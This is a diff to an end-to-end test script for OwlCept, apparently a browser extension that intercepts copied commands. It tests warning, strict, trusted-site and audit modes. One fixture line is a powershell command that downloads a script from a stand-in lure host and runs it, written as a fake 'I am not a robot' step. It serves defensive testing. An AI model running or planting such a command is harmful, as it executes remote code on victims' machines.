@@ -13,6 +13,8 @@ const shots = process.argv.includes('--shots') ? new URL('../docs/assets/', impo
 if (shots) mkdirSync(shots, { recursive: true });
 
 const BLOCKED = 'powershell -c "iwr https://example-lure.test/stage.ps1 | iex" # I am not a robot - Verification ID: 88231';
+// Warns but does not block: a scheduled task, copied with a visible button.
+const DOUBTFUL = 'schtasks /create /tn NightlyBackup /tr C:\\Scripts\\backup.bat /sc daily';
 const OAUTH = `http://localhost:8400/?code=0.AXEA${'x'.repeat(120)}&state=abc123&session_state=s1`;
 
 const page = (body) => `<!doctype html><meta charset="utf-8"><title>OwlCept e2e</title>
@@ -24,6 +26,8 @@ const PAGES = {
     <button id="copy" onclick="navigator.clipboard.writeText(document.getElementById('cmd').textContent)">Copy</button>`),
   'https://example-lure.test/': page(`<h1>Test page</h1><p>Plain fixture: the button writes a defanged command to the clipboard.</p>
     <button id="copy" onclick='navigator.clipboard.writeText(${JSON.stringify(BLOCKED)})'>Copy</button>`),
+  'https://admin.example.test/': page(`<h1>Backup guide</h1><pre id="cmd">${DOUBTFUL}</pre>
+    <button id="copy" onclick="navigator.clipboard.writeText(document.getElementById('cmd').textContent)">Copy</button>`),
   'https://connect.example-lure.test/': page(`<h1>Connect your account</h1><textarea id="box"></textarea>`),
 };
 
@@ -95,6 +99,44 @@ const popup = await p4.evaluate(() => ({
 check('popup renders with its icon', popup.status.startsWith('Protected:') && popup.icon > 0, popup.status);
 check('popup lists the blocked events', popup.blocked >= 2, `${popup.blocked} listed`);
 if (shots) await p4.screenshot({ path: `${shots}ext-popup.png` });
+
+// 5. Protection modes and trusted sites. Settings are written the way the popup writes them.
+const setSettings = (patch) => worker.evaluate(async (p) => {
+  const { settings = {} } = await chrome.storage.local.get('settings');
+  await chrome.storage.local.set({ settings: { ...settings, ...p } });
+}, patch);
+const copyOn = async (url) => {
+  const p = await context.newPage();
+  await p.goto(url);
+  await p.waitForTimeout(300);
+  await p.evaluate(() => navigator.clipboard.writeText('(empty)'));
+  await p.click('#copy');
+  await p.waitForTimeout(900);
+  return { page: p, banner: await banner(p), clip: await clip(p) };
+};
+
+let r = await copyOn('https://admin.example.test/');
+check('smart: a doubtful command shows a warning but copies as-is', r.banner && r.clip === DOUBTFUL);
+
+await setSettings({ mode: 'strict' });
+r = await copyOn('https://admin.example.test/');
+check('strict: a doubtful command is blocked and the clipboard replaced', r.banner && r.clip.startsWith('# OwlCept'));
+if (shots) await r.page.screenshot({ path: `${shots}ext-strict.png` });
+
+await setSettings({ mode: 'smart', trustedSites: ['example.test'] });
+r = await copyOn('https://admin.example.test/');
+check('trusted site: the warning is skipped', !r.banner && r.clip === DOUBTFUL);
+r = await copyOn('https://example-lure.test/');
+check('trusted sites never skip a block', r.banner && r.clip !== BLOCKED);
+await setSettings({ trustedSites: ['example-lure.test'] });
+r = await copyOn('https://example-lure.test/');
+check('…even when that exact site is trusted', r.banner && r.clip !== BLOCKED);
+
+await setSettings({ mode: 'audit', trustedSites: [] });
+r = await copyOn('https://example-lure.test/');
+const events = await worker.evaluate(async () => (await chrome.storage.local.get('events')).events ?? []);
+check('audit: nothing is shown or replaced, the block is logged', !r.banner && r.clip === BLOCKED && events[0]?.note === 'audit');
+await setSettings({ mode: 'smart' });
 
 await context.close();
 const failed = results.filter((r) => !r).length;
